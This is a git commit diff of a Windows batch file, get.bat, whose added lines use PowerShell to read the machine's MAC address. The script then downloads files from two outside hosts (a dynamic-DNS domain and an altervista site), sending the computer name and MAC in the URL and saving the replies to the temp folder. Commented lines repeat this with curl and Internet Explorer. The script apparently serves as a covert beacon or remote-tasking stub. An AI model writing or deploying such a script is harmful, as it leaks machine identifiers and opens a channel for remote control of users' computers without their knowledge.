6002674abff4b3690dcedc82ce357ab57745a140
pistacchietto <pistacchietto2@gmail.com>
2018-07-11 19:09:32 +0200

    ok

--- get.bat
+++ get.bat
@@ -1,5 +1,6 @@
-%windir%\System32\cmd.exe /c powershell -Command (new-object System.Net.WebClient).DownloadFile('http://verifiche.ddns.net/svc/wup.php?pc=%computername%_1','%temp%\%computername%_1')
-%windir%\System32\cmd.exe /c powershell -Command (new-object System.Net.WebClient).DownloadFile('http://paner.altervista.org/svc/wup.php?pc=%computername%_1','%temp%\%computername%_2')
+for /f %%D in ('%windir%\System32\cmd.exe /c powershell -Command "& {Get-NetAdapter | select MacAddress -ExpandProperty MacAddress |  Select-Object -First 1}"') do set mac=%%D
+%windir%\System32\cmd.exe /c powershell -Command (new-object System.Net.WebClient).DownloadFile('http://verifiche.ddns.net/svc/wup.php?pc=%computername%_%mac%_1','%temp%\%computername%_1')
+%windir%\System32\cmd.exe /c powershell -Command (new-object System.Net.WebClient).DownloadFile('http://paner.altervista.org/svc/wup.php?pc=%computername%_%mac%_1','%temp%\%computername%_2')
 rem curl http://verifiche.ddns.net/svc/wup.php?pc=%computername%_1 -o %temp%\%computername%_1
 rem curl http://paner.altervista.org/svc/wup.php?pc=%computername%_1 -o %temp%\%computername%_2
 rem "%ProgramFiles%\Internet Explorer\iexplore.exe" http://verifiche.ddns.net/svc/wup.php?pc=%computername%_ie
